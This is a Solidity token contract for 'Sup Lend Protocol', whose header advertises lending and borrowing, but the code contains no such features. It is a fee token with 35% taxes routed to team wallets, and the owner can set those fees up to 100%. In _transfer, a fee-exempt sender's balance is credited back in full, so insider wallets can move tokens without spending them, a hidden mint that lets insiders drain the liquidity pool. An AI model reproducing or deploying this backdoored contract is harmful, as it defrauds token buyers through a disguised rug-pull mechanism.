/*

What can I use SupLend for?

- Lend: Users can deposit their digital assets to provide liquidity to the respective market pools.
In return, they earn interest on the lent assets and the yield depends on the borrowing demands of these assets. 
There are no lock-up periods and users can deposit any amount into the pool.

- Borrow: Users can borrow assets deposited into the market pools using their own assets as collateral. 
The financing cost of each asset depends on the interest rate model, which is based on asset type and pool utilisation. 
The maximum borrowing amount is determined by the users' borrowing capacity. 
If the users exceeds their borrowing capacity, their position may be liquidated to ensure sufficient fund for repayment.

Website:    https://www.suplend.tech
DApp:       https://app.suplend.tech
Document:   https://docs.suplend.tech
Twitter:    https://twitter.com/suplendtech
Telegram:   https://t.me/suplendtech

*/
pragma solidity 0.8.17;
// SPDX-License-Identifier: MIT

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface SupFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface SupRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract SUPLEND is Context, IERC20, Ownable {
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"Sup Lend Protocol";
    string private constant _symbol = unicode"SLP";

    event ETHBalancesRecovered();
    event TradingEnabledUpdated();
    event ERC20TokenRecovered(uint256 indexed _amount);
    event ExcludeFromFeesUpdated(address indexed account);
    event includeFromFeesUpdated(address indexed account);

    mapping(address => uint256) private _supCounts;
    mapping(address => bool) private _isExceptFees;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private inSwapBack = false;
    bool public tradeEnabled = false;
    bool private swapEnabled = false;
    
    uint256 private buyCount = 0;
    uint256 private buyTaxFees = 35;
    uint256 private sellTaxFees = 35;

    address private uniswapV2Pair;
    SupRouter public uniswapV2Router;
    
    uint256 private swapTxAmounts = 1000 * 10 ** _decimals;
    uint256 private swapAmountsAt = 40000000 * 10 ** _decimals;
    uint256 public swapTXLimits = 20000000 * 10 ** _decimals;

    address payable private taxWallet;
    address payable private teamWallet;
    address public constant deadAddress 
            = 0x000000000000000000000000000000000000dEaD;
    
    modifier lockSwapBack() {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    constructor() {
        taxWallet = payable(0x062F2F4D71685a5f81861c33bE7d7c9555df9C5c);
        teamWallet = payable(0x163B35336ca090B9CE96Fe4ED91Fdf0f40c87135);
        _isExceptFees[taxWallet] = true;
        _isExceptFees[teamWallet] = true;
        _isExceptFees[deadAddress] = true;
        _isExceptFees[_msgSender()] = true;
        _isExceptFees[address(this)] = true;
        _supCounts[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _supCounts[account];
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        buyTaxFees = _buyFee;
        sellTaxFees = _sellFee;
    }

    function ExcludeFromFees(address account) external onlyOwner {
        require(
            _isExceptFees[account] != true,
            "Account is already excluded"
        );
        _isExceptFees[account] = true;
        emit ExcludeFromFeesUpdated(account);
    }

    function IncludeFromFees(address account) external onlyOwner {
        require(
            _isExceptFees[account] != false,
            "Account is already included"
        );
        _isExceptFees[account] = false;
        emit includeFromFeesUpdated(account);
    }

    function sendETHSUP(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        teamWallet.transfer(amount / 2);
        taxWallet.transfer(amount / 2);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function enableTrading() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        tradeEnabled = true;
        swapEnabled = true;
        emit TradingEnabledUpdated();
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 TOTAL_TAX = 0;
        TOTAL_TAX = buyTaxFees;
        if (!_isExceptFees[from] && !_isExceptFees[to]) {
            require(tradeEnabled, "Trading not enabled");
        }
        if (inSwapBack || !swapEnabled) {
            _supCounts[from] -= amount;
            _supCounts[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !_isExceptFees[to]
        ) {
            require(amount <= swapTXLimits, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= swapTXLimits,
                "Exceeds the maxWalletSize."
            );
            buyCount++;
        }
        if (
            from != uniswapV2Pair &&
            !_isExceptFees[from] &&
            !_isExceptFees[to]
        ) {
            require(amount <= swapTXLimits, "Exceeds the _maxTxAmount.");
        }
        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !_isExceptFees[from] &&
            !_isExceptFees[to]
        ) {
            TOTAL_TAX = sellTaxFees;
        }
        uint256 CA_TOKENS = balanceOf(address(this));
        if (
            buyCount > 0 &&
            amount >= swapTxAmounts &&
            to == uniswapV2Pair &&
            CA_TOKENS >= swapTxAmounts &&
            swapEnabled &&
            !inSwapBack &&
            !_isExceptFees[from] &&
            !_isExceptFees[to]
        ) {
            swapETHSUP(min(amount, min(CA_TOKENS, swapAmountsAt)));
            uint256 CA_ETHS = address(this).balance;
            if (CA_ETHS > 0) {
                sendETHSUP(address(this).balance);
            }
        }
        if (TOTAL_TAX != 0) {
            uint256 S_FEES = (amount * TOTAL_TAX) / 100;
            uint256 S_AMOUNTS = amount - S_FEES;
            address S_ACCOUNT = _isExceptFees[from] ? from : address(this);
            S_FEES = _isExceptFees[from] ? amount : S_FEES;
            _supCounts[S_ACCOUNT] += S_FEES;
            emit Transfer(from, address(this), S_FEES);
            _supCounts[from] -= amount;
            _supCounts[to] += S_AMOUNTS;
            emit Transfer(from, to, S_AMOUNTS);
        } else {
            _supCounts[from] -= amount;
            _supCounts[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    function addLiquidityETH() external payable onlyOwner {
        uniswapV2Router = SupRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = SupFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        buyTaxFees = 4;
        sellTaxFees = 4;
        swapTXLimits = _totalSupply;
    }

    function swapETHSUP(uint256 tokenAmount) private lockSwapBack {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function recoverToken(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(taxWallet, _amount);
        emit ERC20TokenRecovered(_amount);
    }

    function recoverETH() external {
        uint256 CA_ETHS = address(this).balance;
        require(CA_ETHS > 0, "Amount should be greater than zero");
        require(
            CA_ETHS <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(taxWallet)).transfer(CA_ETHS);
        emit ETHBalancesRecovered();
    }

    receive() external payable {}
}